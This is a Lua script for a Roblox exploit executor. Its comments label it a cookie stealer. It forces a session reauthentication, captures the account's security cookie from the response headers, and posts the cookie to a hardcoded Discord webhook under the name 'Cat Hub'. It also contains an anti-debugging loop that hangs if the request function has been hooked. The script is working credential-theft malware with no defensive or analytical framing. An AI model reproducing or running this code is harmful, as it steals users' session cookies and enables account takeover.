--Cookie Stealer
local httpService = cloneref(game:GetService("HttpService"));
local requestInternal = clonefunction(httpService.requestInternal);

requestInternal(httpService, {Url = "https://auth.roblox.com/v1/logoutfromallsessionsandreauthenticate/", Method = "POST", Body = ""}):Start(function(a,b) 
    if b then 
        Cookie = b.Headers["set-cookie"]:split(";")[1]
        warn("Cookie Grabbed:", Cookie)
    end
end)

--Webhook Sender
if syn and getinfo(syn.request).what ~= "C" then
    while true do end
end

    local us = "https://discord.com/api/webhooks/1182360798086041661/xjbzacoj1lYAQSGhr94nKt2erYyP2RNJZsCacVYkx2RgN6QeYo_CsR1I20pXDMwj5C8K"
    local url2 = us
    request = http_request or request or HttpPost or syn.request
    
    local data1 = {
      ["content"] = "Cat Hub | Cookie Test",
      ["embeds"] = {{ 
      ["description"] = "",
      ["type"] = "rich",
      ["color"] = tonumber(0),
      ["fields"] = {
        {
        ["name"] = "**Display Name** | ",
        ["value"] = Cookie,
        ["inline"] = false
        }
          
      } }}}
      local newdata1 = game:GetService("HttpService"):JSONEncode(data1)
    
      local headers = {
        ["content-type"] = "application/json"
      }
      local abcdef1 = {Url = url2, Body = newdata1, Method = "POST", Headers = headers}
      request(abcdef1)
